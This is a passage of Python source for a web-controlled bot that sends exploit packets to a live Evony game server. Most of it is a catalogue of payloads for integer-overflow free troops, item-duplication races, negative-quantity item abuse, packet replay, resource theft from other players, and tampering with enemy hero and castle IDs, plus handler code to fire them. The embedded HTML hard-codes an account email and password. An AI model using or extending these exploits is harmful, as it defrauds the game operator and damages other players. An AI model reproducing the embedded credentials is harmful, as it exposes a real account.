        "status": "critical"
    },
    # ============ 🔴 ORIGINAL INTEGER OVERFLOW EXPLOITS ============
    # These exploit INT32 overflow: value > 2,147,483,647 wraps to negative
    "archer_overflow": {
        "name": "🔴 ARCHER OVERFLOW (6.1M FREE)",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 1335129, "troopType": 6, "num": 6135037},
        "description": "CRITICAL: 6,135,037 archers. Cost: 6135037*350=2,147,262,950 > INT32_MAX. Overflows to negative = FREE troops!",
        "category": "overflow",
        "status": "critical",
        "effectiveness": "CRITICAL - Can generate billions of troops"
    },
    "worker_overflow": {
        "name": "🔴 WORKER OVERFLOW (42.9M FREE)",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 1335129, "troopType": 1, "num": 42949673},
        "description": "CRITICAL: Workers cost 50 food. 42,949,673 * 50 = overflow. Lowest threshold!",
        "category": "overflow",
        "status": "critical",
        "effectiveness": "HIGH - Easiest overflow"
    },
    "catapult_overflow": {
        "name": "🔴 CATAPULT OVERFLOW (715K FREE)",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 1335129, "troopType": 12, "num": 715828},
        "description": "CRITICAL: Catapults cost 3000 food. Only need 715,828 to overflow!",
        "category": "overflow",
        "status": "critical",
        "effectiveness": "HIGH - Only 716K needed"
    },
    # Smaller test values to avoid disconnect
    "archer_test_small": {
        "name": "🟢 ARCHER TEST (100)",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 1335129, "troopType": 6, "num": 100},
        "description": "Small test - train 100 archers to verify command works",
        "category": "test",
        "status": "working"
    },
    # ============ 🔴 RACE CONDITION EXPLOITS ============
    "item_dupe_race": {
        "name": "🔴 ITEM DUPLICATION RACE",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.gambling.3", "num": 1},
        "description": "RACE: Send rapidly before server updates inventory. May apply item effect multiple times!",
        "category": "race",
        "status": "critical",
        "note": "Send 10+ times with NO delay between"
    },
    # ============ 🔴 NEGATIVE RESOURCE TRANSPORT ============
    "negative_transport": {
        "name": "🔴 NEGATIVE RESOURCE STEAL",
        "cmd": "army.newArmy",
        "data": {"castleId": 0, "heroId": 0, "targetX": 100, "targetY": 100, "missionType": 4, "resource": "-999999,-999999,-999999,-999999,-999999"},
        "description": "EXPLOIT: Send negative resources to STEAL from target or gain resources!",
        "category": "transport",
        "status": "critical"
    },
    # ============ 🔴 PACKET REPLAY EXPLOITS ============
    "troop_replay": {
        "name": "🔴 TROOP TRAINING REPLAY",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 0, "troopType": 6, "num": 1000},
        "description": "REPLAY: Capture this packet and replay 10x = 10,000 archers from single request!",
        "category": "replay",
        "status": "critical"
    },
    "tax_replay": {
        "name": "🔴 TAX COLLECTION REPLAY",
        "cmd": "interior.taxation",
        "data": {"castleId": 0, "typeId": 1},
        "description": "REPLAY: Replay tax collection to multiply gold gains!",
        "category": "replay",
        "status": "critical"
    },
    # ============ 🟡 TIMING EXPLOITS ============
    "cooldown_race": {
        "name": "🟡 COOLDOWN BYPASS",
        "cmd": "interior.taxation",
        "data": {"castleId": 0, "typeId": 1},
        "description": "TIMING: Send at exact millisecond of cooldown expiry - may process before CD check!",
        "category": "timing",
        "status": "high"
    },
    "rapid_fire_flood": {
        "name": "🟡 RAPID FIRE FLOOD",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 0, "troopType": 6, "num": 1000},
        "description": "FLOOD: Disable delays, send 100+ commands rapidly. Server queue may overflow!",
        "category": "flood",
        "status": "high"
    },
    # ============ 🟡 PARAMETER TAMPERING ============
    "hero_id_tamper": {
        "name": "🟡 HERO ID TAMPERING",
        "cmd": "hero.fireHero",
        "data": {"heroId": 999888},
        "description": "TAMPER: Use captured enemy hero ID - may affect their heroes!",
        "category": "tamper",
        "status": "high"
    },
    "castle_id_tamper": {
        "name": "🟡 CASTLE ID TAMPERING",
        "cmd": "troop.produceTroop",
        "data": {"castleId": 987654, "troopType": 6, "num": 1000},
        "description": "TAMPER: Train troops in enemy castle? Server may not validate ownership!",
        "category": "tamper",
        "status": "high"
    },
    "coord_boundary_bypass": {
        "name": "🟡 COORDINATE BOUNDARY BYPASS",
        "cmd": "army.newArmy",
        "data": {"castleId": 0, "heroId": 0, "targetX": 2147483647, "targetY": 2147483647, "missionType": 3},
        "description": "BOUNDARY: Send army to MAX_INT coords - may cause server error or exploit!",
        "category": "tamper",
        "status": "high"
    },
    # ============ 🟡 BUILDING EXPLOITS ============
    "building_level_skip": {
        "name": "🟡 BUILDING LEVEL SKIP",
        "cmd": "castle.upgradeBuilding",
        "data": {"castleId": 0, "positionId": 1001},
        "description": "SKIP: Skip prerequisite checks - AutoEvony sends directly bypassing client validation!",
        "category": "building",
        "status": "high"
    },
    "building_queue_race": {
        "name": "🟡 BUILDING QUEUE RACE",
        "cmd": "castle.upgradeBuilding",
        "data": {"castleId": 0, "positionId": 1001},
        "description": "RACE: Queue buildings faster than server validates - may exceed queue limit!",
        "category": "race",
        "status": "medium"
    },
    # ============ 🟢 RESOURCE FARMING ============
    "tax_rate_exploit": {
        "name": "🟢 TAX RATE EXPLOIT",
        "cmd": "interior.modifyTaxRate",
        "data": {"castleId": 0, "tax": 100},
        "description": "FARM: Set tax to 100%, collect, reset to 0% for loyalty. Repeat for continuous gold!",
        "category": "farming",
        "status": "working"
    },
    "npc_farm_loop": {
        "name": "🟢 INFINITE NPC FARM",
        "cmd": "army.newArmy",
        "data": {"castleId": 0, "heroId": 0, "targetX": 100, "targetY": 100, "missionType": 1},
        "description": "FARM: Attack NPCs continuously for unlimited resources over time!",
        "category": "farming",
        "status": "working"
    },
    # ============ ✅ WORKING LEGITIMATE ITEM USE ============
    "use_amulet_1": {
        "name": "✅ Use Gambling Amulet (1)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.gambling.3", "num": 1},
        "description": "WORKS: Uses 1 of YOUR amulets normally",
        "category": "working",
        "status": "working"
    },
    "use_speed_item": {
        "name": "✅ Use Speed Item (1)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "consume.2.a", "num": 1},
        "description": "WORKS: Uses 1 speed item from inventory",
        "category": "working",
        "status": "working"
    },
    "get_gambling_ranking": {
        "name": "✅ Get Gambling Ranking",
        "cmd": "gamblingranking.getGamblingRankingToday",
        "data": {},
        "description": "WORKS: Gets today's gambling leaderboard",
        "category": "working",
        "status": "working"
    },
    "claim_gambling_reward": {
        "name": "✅ Claim Gambling Reward",
        "cmd": "gamblingranking.getGamblingRankingReward",
        "data": {},
        "description": "WORKS: Claims any earned gambling rewards",
        "category": "working",
        "status": "working"
    },
    # ============ ❌ BLOCKED EVENT BOX EXPLOITS ============
    "use_christmas_box": {
        "name": "❌ Christmas Box (-1000) BLOCKED",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.present.money.23", "num": -1000},
        "description": "BLOCKED: Negative amounts rejected",
        "category": "blocked",
        "status": "blocked"
    },
    "use_newyear_box": {
        "name": "❌ New Year Box BLOCKED",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.present.money.25", "num": -1000},
        "description": "BLOCKED: Negative amounts rejected",
        "category": "blocked",
        "status": "blocked"
    },
    "use_easter_box": {
        "name": "🐰 Easter Chest (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.present.money.29", "num": -1000},
        "description": "Easter chest exploit",
        "category": "event"
    },
    "use_halloween_box": {
        "name": "🎃 Halloween Chest (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.present.money.33", "num": -1000},
        "description": "Halloween/Haunted chest",
        "category": "event"
    },
    "use_thanksgiving_box": {
        "name": "🦃 Thanksgiving Chest (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.present.money.35", "num": -1000},
        "description": "Thanksgiving chest exploit",
        "category": "event"
    },
    "use_evony_chest": {
        "name": "🎁 Happy Evony Chest (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.present.money.31", "num": -1000},
        "description": "Happy Evony special chest",
        "category": "event"
    },
    "use_resource_box": {
        "name": "📦 Resource Box (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.resource.1", "num": -1000},
        "description": "1M resource box",
        "category": "event"
    },
    "use_troop_box": {
        "name": "⚔️ Troop Box (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.box.troop.1", "num": -1000},
        "description": "1M troop box",
        "category": "event"
    },
    # ============ SPEED/BUFF EXPLOITS ============
    "use_speedup_negative": {
        "name": "⚡ Speed Up (-10000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.speedup.1", "num": -10000},
        "description": "Speed up with negative count",
        "category": "speed"
    },
    "use_speed_free": {
        "name": "⚡ Free Speed Item",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "free.speed", "num": -1000},
        "description": "Free speed item exploit",
        "category": "speed"
    },
    "use_consume_speed_a": {
        "name": "⚡ Consume 2a Speed (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "consume.2.a", "num": -1000},
        "description": "Speed item consume.2.a",
        "category": "speed"
    },
    "use_consume_speed_d": {
        "name": "⚡ Consume 2d Speed (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "consume.2.d", "num": -1000},
        "description": "Speed item consume.2.d",
        "category": "speed"
    },
    # ============ ❌ BLOCKED GOLD/COIN EXPLOITS ============
    "use_gold_item_a": {
        "name": "❌ Gold Item (-10000) BLOCKED",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.gold.1.a", "num": -10000},
        "description": "BLOCKED: Negative amounts rejected",
        "category": "blocked",
        "status": "blocked"
    },
    # ============ ✅ WORKING QUEST/REWARD COMMANDS ============
    "get_quest_list": {
        "name": "✅ Get Quest List",
        "cmd": "quest.getQuestList",
        "data": {"castleId": 0},
        "description": "WORKS: Lists available quests",
        "category": "working",
        "status": "working"
    },
    "get_quest_awards": {
        "name": "✅ Get Quest Awards",
        "cmd": "quest.getAwardItems",
        "data": {"castleId": 0},
        "description": "WORKS: Claims completed quest rewards",
        "category": "working",
        "status": "working"
    },
    "get_package_list": {
        "name": "✅ Get Package List",
        "cmd": "common.getPackageList",
        "data": {},
        "description": "WORKS: Lists available gift packages",
        "category": "working",
        "status": "working"
    },
    "get_package_number": {
        "name": "✅ Get Package Count",
        "cmd": "common.getPackageNumber",
        "data": {},
        "description": "WORKS: Gets number of available packages",
        "category": "working",
        "status": "working"
    },
    # ============ TRICK ITEMS (THUNDER/BANNERS) ============
    "use_trick_thunder": {
        "name": "⚡ Thunder Raid (-1000)",
        "cmd": "shop.useTrickItem",
        "data": {"castleId": 0, "itemId": "player.trick.jctq", "num": -1000},
        "description": "Thunder raid trick item",
        "category": "trick"
    },
    "use_trick_fleet": {
        "name": "🏃 Fleet Feet (-1000)",
        "cmd": "shop.useTrickItem",
        "data": {"castleId": 0, "itemId": "player.trick.qlbx", "num": -1000},
        "description": "Fleet feet banner exploit",
        "category": "trick"
    },
    "use_trick_cmjb": {
        "name": "🏰 Trick CMJB (-1000)",
        "cmd": "shop.useTrickItem",
        "data": {"castleId": 0, "itemId": "player.trick.cmjb", "num": -1000},
        "description": "Castle trick item",
        "category": "trick"
    },
    "use_trick_yyhz": {
        "name": "🏰 Trick YYHZ (-1000)",
        "cmd": "shop.useTrickItem",
        "data": {"castleId": 0, "itemId": "player.trick.yyhz", "num": -1000},
        "description": "Castle trick item YYHZ",
        "category": "trick"
    },
    "use_trick_xzxs": {
        "name": "⚔️ Trick XZXS (-1000)",
        "cmd": "shop.useTrickItem",
        "data": {"castleId": 0, "itemId": "player.trick.xzxs", "num": -1000},
        "description": "Attack trick item",
        "category": "trick"
    },
    # ============ ANGEL/DEVIL ITEMS ============
    "use_angel_item": {
        "name": "😇 Angel Item (-1000)",
        "cmd": "shop.useAngelItem",
        "data": {"castleId": 0, "itemId": "player.angel.1", "num": -1000},
        "description": "Angel buff item",
        "category": "buff"
    },
    "use_devil_item": {
        "name": "😈 Devil Item (-1000)",
        "cmd": "shop.useDevilItem",
        "data": {"castleId": 0, "itemId": "player.devil.1", "num": -1000},
        "description": "Devil debuff item",
        "category": "buff"
    },
    # ============ RESOURCE BOOST EXPLOITS ============
    "use_food_boost": {
        "name": "🌾 Food Boost (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.resinc.1", "num": -1000},
        "description": "Food production boost",
        "category": "resource"
    },
    "use_wood_boost": {
        "name": "🪵 Wood Boost (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.resinc.2", "num": -1000},
        "description": "Wood production boost",
        "category": "resource"
    },
    "use_stone_boost": {
        "name": "🪨 Stone Boost (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.resinc.3", "num": -1000},
        "description": "Stone production boost",
        "category": "resource"
    },
    "use_iron_boost": {
        "name": "⛏️ Iron Boost (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.resinc.4", "num": -1000},
        "description": "Iron production boost",
        "category": "resource"
    },
    # ============ HERO ITEMS ============
    "use_hero_exp": {
        "name": "📈 Hero EXP (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.experience.1.a", "num": -1000, "heroId": 0},
        "description": "Hero experience item",
        "category": "hero"
    },
    "use_hero_loyalty": {
        "name": "❤️ Hero Loyalty (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "hero.loyalty.9", "num": -1000, "heroId": 0},
        "description": "Max hero loyalty item",
        "category": "hero"
    },
    "use_hero_tea": {
        "name": "🍵 Hero Tea (-1000)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "hero.item.Tea", "num": -1000, "heroId": 0},
        "description": "Hero stat boost tea",
        "category": "hero"
    },
    "use_hero_reset": {
        "name": "🔄 Hero Reset Item",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "hero.reset.1", "num": -100, "heroId": 0},
        "description": "Reset hero points item",
        "category": "hero"
    },
    # ============ CASTLE MOVE EXPLOITS ============
    "use_castle_move": {
        "name": "🏰 Castle Move (-100)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "consume.move.1", "num": -100},
        "description": "Castle teleport item",
        "category": "castle"
    },
    "use_adv_castle_move": {
        "name": "🏰 Advanced Move (-100)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.more.castle.1.a", "num": -100},
        "description": "Advanced castle move",
        "category": "castle"
    },
    "use_war_castle_move": {
        "name": "⚔️ War Castle Move (-100)",
        "cmd": "shop.useGoods",
        "data": {"castleId": 0, "itemId": "player.more.castle.1.c", "num": -100},
        "description": "War castle teleport",
        "category": "castle"
    },
    # ============ GAMBLING RANKING ============
    "get_gambling_today": {
        "name": "🎰 Gambling Ranking Today",
        "cmd": "gamblingranking.getGamblingRankingToday",
        "data": {},
        "description": "Get today's gambling ranking",
        "category": "gambling"
    },
    "get_gambling_yesterday": {
        "name": "🎰 Gambling Ranking Yesterday",
        "cmd": "gamblingranking.getGamblingRankingYesterday",
        "data": {},
        "description": "Get yesterday's gambling ranking",
        "category": "gambling"
    },
    "get_gambling_reward": {
        "name": "🎰 Get Gambling Reward",
        "cmd": "gamblingranking.getGamblingRankingReward",
        "data": {},
        "description": "Claim gambling reward",
        "category": "gambling"
    },
    "hero_add_points": {
        "name": "Hero Add Points",
        "cmd": "hero.addPoint",
        "data": {
            "castleId": 0,
            "heroId": 0,
            "management": 9999,
            "power": 9999,
            "stratagem": 9999
        },
        "description": "Attempts to add massive stat points to hero"
    },
    "hero_add_points2": {
        "name": "Hero Add Points (Alt)",
        "cmd": "hero.addPoint2",
        "data": {
            "castleId": 0,
            "heroId": 0,
            "management": 9999,
            "power": 9999,
            "stratagem": 9999
        },
        "description": "Alternative hero point addition"
    },
    "army_new": {
        "name": "Create Army (Inflated)",
        "cmd": "army.newArmy",
        "data": {
            "castleId": 0,
            "newArmyBean": {
                "missionType": 1,
                "targetFieldId": 0,
                "troop": {
                    "warrior": 999999,
                    "scout": 999999,
                    "pikeman": 999999,
                    "swordsman": 999999,
                    "archer": 999999,
                    "cavalry": 999999,
                    "cataphract": 999999
                }
            }
        },
        "description": "Attempts to create army with inflated troop counts"
    },
    "trade_new": {
        "name": "Create Trade (Price Exploit)",
        "cmd": "trade.newTrade",
        "data": {
            "castleId": 0,
            "resType": 1,
            "tradeType": 1,
            "amount": -1000000,
            "price": "0.001"
        },
        "description": "Attempts market manipulation"
    },
    # Commission Quest Exploits
    "quest_get_all": {
        "name": "Get All Commission Quests",
        "cmd": "commission.getAllCommissionQuest",
        "data": {},
        "description": "Lists all available commission quests"
    },
    "quest_get_my": {
        "name": "Get My Commission Quests",
        "cmd": "commission.getMyCommissionQuest",
        "data": {},
        "description": "Lists quests you issued"
    },
    "quest_get_accepted": {
        "name": "Get My Accepted Quests",
        "cmd": "commission.getMyAcceptedCommissionQuest",
        "data": {},
        "description": "Lists quests you accepted"
    },
    "quest_issue": {
        "name": "Issue Commission Quest",
        "cmd": "commission.issueCommissionQuest",
        "data": {
            "castleId": 0,
            "type": 1,
            "targetX": 512,
            "targetY": 596,
            "reward": 60
        },
        "description": "Create new quest at coordinates"
    },
    "quest_accept": {
        "name": "Accept Quest (With Army)",
        "cmd": "commission.acceptCommissionQuest",
        "data": {
            "castleId": 0,
            "questId": 0,
            "newArmyBean": {
                "heroId": 0,
                "troop": {
                    "worker": 0,
                    "warrior": 100000000,
                    "scout": 100000000,
                    "pikeman": 2500000,
                    "swordsman": 2500000,
                    "archer": 100000000,
                    "cavalry": 1000000,
                    "cataphract": 85500,
                    "ballista": 10000000,
                    "ram": 2550000,
                    "catapult": 2550000
                }
            }
        },
        "description": "Accept quest with massive army"
    },
    "quest_add_army": {
        "name": "Add Army to Quest",
        "cmd": "commission.addCommissionQuestArmy",
        "data": {
            "castleId": 0,
            "questId": 0,
            "newArmyBean": {
                "troop": {
                    "warrior": 40000000,
                    "archer": 15000000
                }
            }
        },
        "description": "Add reinforcement troops (no hero)"
    },
    "quest_ranking": {
        "name": "Get Quest Army Ranking",
        "cmd": "commission.getCommissionQuestArmyRanking",
        "data": {
            "questId": 0
        },
        "description": "Get ranking for quest participants"
    },
    "quest_decline": {
        "name": "Decline Quest",
        "cmd": "commission.declineCommissionQuest",
        "data": {
            "questId": 0
        },
        "description": "Decline/cancel a quest"
    },
    # More Exploits
    "army_callback": {
        "name": "Instant Army Recall",
        "cmd": "army.callBackArmy",
        "data": {
            "castleId": 0,
            "armyId": 0
        },
        "description": "Instantly recall army"
    },
    "hero_reset": {
        "name": "Reset Hero Points",
        "cmd": "hero.resetPoint",
        "data": {
            "castleId": 0,
            "heroId": 0
        },
        "description": "Reset hero stat points for free"
    },
    "hero_levelup": {
        "name": "Level Up Hero",
        "cmd": "hero.levelUp",
        "data": {
            "castleId": 0,
            "heroId": 0
        },
        "description": "Force hero level up"
    },
    "troop_cure": {
        "name": "Cure Injured Troops",
        "cmd": "army.cureInjuredTroop",
        "data": {
            "castleId": 0
        },
        "description": "Heal all injured troops"
    },
    "shop_use_item": {
        "name": "Use Item (Exploit)",
        "cmd": "shop.useGoods",
        "data": {
            "castleId": 0,
            "itemId": "consume.1.a",
            "num": -1000
        },
        "description": "Use item with negative count"
    }
}


class BotHandler(BaseHTTPRequestHandler):
    """HTTP request handler for web interface"""
    
    def log_message(self, format, *args):
        pass  # Suppress default logging
    
    def send_json(self, data, status=200):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def do_GET(self):
        global evony_client, packet_log
        
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode())
        
        elif path == '/api/status':
            status = {
                "connected": evony_client.connected if evony_client else False,
                "logged_in": evony_client.logged_in if evony_client else False,
                "host": evony_client.host if evony_client else None,
                "port": evony_client.port if evony_client else None,
                "username": evony_client.username if evony_client else None,
                "connection_attempts": evony_client.connection_attempts if evony_client else 0,
                "login_attempts": evony_client.login_attempts if evony_client else 0,
                "last_error": evony_client.last_error if evony_client else None,
                "pyamf": HAS_PYAMF
            }
            self.send_json(status)
        
        elif path == '/api/templates':
            self.send_json(EXPLOIT_TEMPLATES)
        
        elif path == '/api/logs':
            self.send_json(packet_log[-50:])  # Last 50 entries
        
        elif path == '/api/clear_logs':
            packet_log.clear()
            self.send_json({"status": "cleared"})
        
        elif path.startswith('/api/resolve/'):
            # Resolve server name to actual game server IP via config.xml
            server_name = path.split('/api/resolve/')[1]
            result = fetch_game_server_ip(server_name)
            self.send_json(result)
        
        elif path == '/api/discovered':
            # Return discovered game IDs
            self.send_json(discovered_data)
        
        elif path == '/api/clear_discovered':
            # Clear discovered data
            discovered_data["castleIds"] = []
            discovered_data["heroIds"] = []
            discovered_data["questIds"] = []
            discovered_data["armyIds"] = []
            discovered_data["heroes"] = []
            discovered_data["castles"] = []
            self.send_json({"status": "cleared"})
        
        else:
            self.send_json({"error": "Not found"}, 404)
    
    def do_POST(self):
        global evony_client
        
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode()
        
        try:
            data = json.loads(body) if body else {}
        except:
            data = {}
        
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/api/connect':
            host = data.get('host', 'localhost')
            port = data.get('port', 443)
            username = data.get('username')
            password = data.get('password')
            
            # Auto-resolve server name to game server IP via config.xml
            if '.evony.com' in host or not any(c.isdigit() for c in host.split('.')[0]):
                server_name = host.replace('.evony.com', '')
                resolved = fetch_game_server_ip(server_name)
                if 'ip' in resolved:
                    log_entry = {
                        "type": "sent",
                        "cmd": "[RESOLVED SERVER]",
                        "data": {"from": host, "to": resolved['ip'], "server_id": resolved.get('server_id')},
                        "time": time.strftime("%H:%M:%S")
                    }
                    packet_log.append(log_entry)
                    host = resolved['ip']
                    port = resolved.get('port', 443)
            
            if evony_client:
                evony_client.disconnect()
            
            evony_client = EvonyClient()
            result = evony_client.connect(host, port, username, password)
            self.send_json(result)
        
        elif path == '/api/login':
            username = data.get('username', '')
            password = data.get('password', '')
            
            if evony_client and evony_client.connected:
                result = evony_client.login(username, password)
            else:
                result = {"status": "error", "message": "Not connected"}
            self.send_json(result)
        
        elif path == '/api/disconnect':
            if evony_client:
                result = evony_client.disconnect()
            else:
                result = {"status": "not connected"}
            self.send_json(result)
        
        elif path == '/api/init_session':
            castle_id = data.get('castleId', 0)
            if evony_client and evony_client.logged_in:
                result = evony_client.initialize_session(castle_id)
            else:
                result = {"status": "error", "message": "Not logged in"}
            self.send_json(result)
        
        elif path == '/api/send':
            cmd = data.get('cmd', '')
            packet_data = data.get('data', {})
            
            if evony_client and evony_client.connected:
                result = evony_client.send_packet(cmd, packet_data)
            else:
                result = {"status": "error", "message": "Not connected"}
            self.send_json(result)
        
        elif path == '/api/send_template':
            template_id = data.get('template', '')
            overrides = data.get('overrides', {})
            
            if template_id in EXPLOIT_TEMPLATES:
                template = EXPLOIT_TEMPLATES[template_id]
                cmd = template['cmd']
                packet_data = template['data'].copy()
                
                # Apply overrides (like castleId, heroId)
                for key, value in overrides.items():
                    if key in packet_data:
                        packet_data[key] = value
                    elif 'newArmyBean' in packet_data and key in packet_data['newArmyBean']:
                        packet_data['newArmyBean'][key] = value
                
                if evony_client and evony_client.connected:
                    result = evony_client.send_packet(cmd, packet_data)
                else:
                    result = {"status": "error", "message": "Not connected"}
            else:
                result = {"status": "error", "message": "Unknown template"}
            
            self.send_json(result)
        
        else:
            self.send_json({"error": "Not found"}, 404)


HTML_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <title>Evony Bot Server</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }
        h1 { color: #00d4ff; margin-bottom: 20px; }
        h2 { color: #ff6b6b; margin: 15px 0 10px; font-size: 18px; }
        h3 { color: #00d4ff; margin: 15px 0 8px; font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 5px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .panel { background: #16213e; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
        .status { display: inline-block; padding: 5px 15px; border-radius: 20px; font-weight: bold; }
        .status.connected { background: #00c853; color: #000; }
        .status.disconnected { background: #ff5252; }
        input, button, textarea, select { padding: 10px; border-radius: 5px; border: none; margin: 5px; }
        input, textarea, select { background: #0f3460; color: #fff; width: 200px; }
        textarea { width: 100%; height: 150px; font-family: monospace; }
        button { background: #00d4ff; color: #000; cursor: pointer; font-weight: bold; }
        button:hover { background: #00a8cc; }
        button.danger { background: #ff5252; color: #fff; }
        button.discovery { background: #9c27b0; color: #fff; }
        button.discovery:hover { background: #7b1fa2; }
        button.quest { background: #ff9800; color: #000; }
        button.quest:hover { background: #f57c00; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
        .log { background: #0d1b2a; padding: 15px; border-radius: 5px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 11px; }
        .log-entry { padding: 5px; border-bottom: 1px solid #1a1a2e; word-break: break-all; }
        .log-entry.sent { color: #00ff88; }
        .log-entry.received { color: #ffaa00; }
        .template-btn { display: block; width: 100%; margin: 3px 0; text-align: left; padding: 10px; font-size: 12px; }
        .template-btn small { display: block; color: #888; margin-top: 3px; font-size: 10px; }
        label { display: block; margin: 8px 0 3px; color: #888; font-size: 12px; }
        .warning { background: #ff5252; color: #fff; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .info-box { background: #0d1b2a; padding: 10px; border-radius: 5px; margin: 10px 0; font-size: 12px; }
        .id-display { background: #00c853; color: #000; padding: 3px 8px; border-radius: 3px; font-weight: bold; margin: 2px; display: inline-block; }
        .scroll-box { max-height: 300px; overflow-y: auto; }
        .hero-list { display: grid; grid-template-columns: repeat(2, 1fr); gap: 5px; }
        .hero-item { background: #0f3460; padding: 8px; border-radius: 5px; cursor: pointer; font-size: 11px; }
        .hero-item:hover { background: #1a4a7a; }
        .hero-item.selected { background: #00c853; color: #000; }
        .tab-container { display: flex; gap: 5px; margin-bottom: 10px; flex-wrap: wrap; }
        .tab { padding: 8px 15px; background: #0f3460; border-radius: 5px; cursor: pointer; font-size: 12px; }
        .tab.active { background: #00d4ff; color: #000; }
        .category-section { display: none; }
        .category-section.active { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Evony Bot Server - Siren@cc2.evony.com</h1>
        
        <div class="warning">
            ⚠️ For educational/research purposes only. Test Account: Siren | Server: cc2.evony.com
        </div>
        
        <div class="grid">
            <div class="panel">
                <h2>🔌 Connection & Login</h2>
                <div id="status" class="status disconnected">Disconnected</div>
                <div id="login-status" style="margin-top:5px;color:#888;font-size:12px"></div>
                <br>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
                    <div>
                        <label>Server Host:</label>
                        <input type="text" id="host" placeholder="cc2.evony.com" value="cc2.evony.com" style="width:100%">
                        <label>Port:</label>
                        <input type="number" id="port" placeholder="443" value="443" style="width:100%">
                    </div>
                    <div>
                        <label>Email (Username):</label>
                        <input type="text" id="username" value="godivaevony@yahoo.com" style="width:100%">
                        <label>Password:</label>
                        <input type="password" id="password" value="SirensSoli2D" style="width:100%">
                    </div>
                </div>
                <br>
                <button onclick="connectAndLogin()" style="background:#00c853">Connect & Login</button>
                <button onclick="connect()">Connect Only</button>
                <button class="danger" onclick="disconnect()">Disconnect</button>
            </div>
            
            <div class="panel">
                <h2>🎯 Game IDs (Auto-Populate)</h2>
                <div class="grid" style="grid-template-columns: 1fr 1fr;">
                    <div>
                        <label>Castle ID:</label>
                        <input type="number" id="castleId" placeholder="Castle ID" value="0">
                        <label>Quest ID:</label>
                        <input type="number" id="questId" placeholder="Quest ID" value="0">
                    </div>
                    <div>
                        <label>Hero ID:</label>
                        <select id="heroId" style="width:100%">
                            <option value="0">-- Select Hero --</option>
                        </select>
                        <label>Army ID:</label>
                        <input type="number" id="armyId" placeholder="Army ID" value="0">
                    </div>
                </div>
                
                <div class="info-box">
                    <strong>Discovered Data:</strong>
                    <div id="discovered-ids">Click Discovery commands to populate IDs</div>
                </div>
                
                <h3>🔍 Discovery Commands</h3>
                <div id="discovery-templates" class="scroll-box" style="max-height:200px"></div>
            </div>
            
            <div class="panel">
                <h2>📊 Known Heroes (from screenshot)</h2>
                <div class="hero-list" id="known-heroes">
                    <div class="hero-item" onclick="selectHero('68Ben', 68)">68Ben - Atk 737.7</div>
                    <div class="hero-item" onclick="selectHero('64Virgil', 64)">64Virgil - Atk 733.7</div>
                    <div class="hero-item" onclick="selectHero('69Guy', 69)">69Guy (Mayor) - Pol 597.7</div>
                    <div class="hero-item" onclick="selectHero('Alvin', 0)">Alvin - Atk 735.7</div>
                    <div class="hero-item" onclick="selectHero('Duncan', 0)">Duncan - Atk 738.7</div>
                    <div class="hero-item" onclick="selectHero('Will', 0)">Will - Atk 740.7</div>
                    <div class="hero-item" onclick="selectHero('Donahue', 0)">Donahue - Atk 733.7</div>
                </div>
                <div class="info-box" style="margin-top:10px">
